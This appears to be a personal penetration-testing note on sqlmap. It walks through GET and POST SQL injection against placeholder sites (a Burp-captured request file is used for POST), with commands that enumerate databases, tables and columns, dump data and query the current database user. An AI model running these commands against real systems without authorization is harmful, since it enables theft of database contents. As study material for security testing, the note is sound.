
---
sqlmap is an open source penetration testing tool developed by Bernardo Damele Assumpcao Guimaraes and Miroslav Stampar that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

## Usage
---

There are two ways we can take advantage of sqlmap GET and POST:

### GET

The simple way to check with sqlmap the vulnerable web page is the following (GET METHOD):

```
# In the next command we retrieve all the database names
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```

With the name of the database we can check for tables with the next command:

```
sqlmap -u https://tessite.com/page.php?id=7 -D DATABASE_NAME --tables
```

When we have the tables we need to check the columns of the table that we want to check for:

```
sqlmap -u https://test.com/page.php?id=7 -D DATABASE_NAME -T TABLE_NAME --columns
```

To get the information of the table name there are two options dump all o dump specific columns

```
sqlmap -u https://test.com/page.php?id=7 --dump -C COLUMN_NAME -T TABLE_NAME -D DBNAME 
```

### POST


For POST METHOD, is most complicated:

- We first need to get the post request on [[burpsuite]] and save it to a file .txt:
	![[Pasted image 20240715195832.png]]
- We can see in the example that there's a variable called blood_group who can be vulnerable to sql injection.
- Then we need to use sqlmap to check the POST REQUEST
	```
	sqlmap -r texfile.txt -p parameter --dbs
	```

Now that we have the databases, we need to find the tables name:

```
sqlmap -r textfile.txt -p parameter -D DATABASE_NAME --tables
```

Now we need to retrieve the column name of the table that we want to get the information:

```
sqlmap -r textfile.txt -p parameter -D DATABASE_NAME -T TABLE_NAME --columns
```

To get the information of the table name there are two options dump all o dump specific columns

```
sqlmap -r textfile.txt -p parameter --dump -T TABLE_NAME -D DBNAME 
```

---

## Enumeration commands

To know the user that is running the database:

```
sqlmap -u http://test.com/shell.php?id=7 --current-user
```
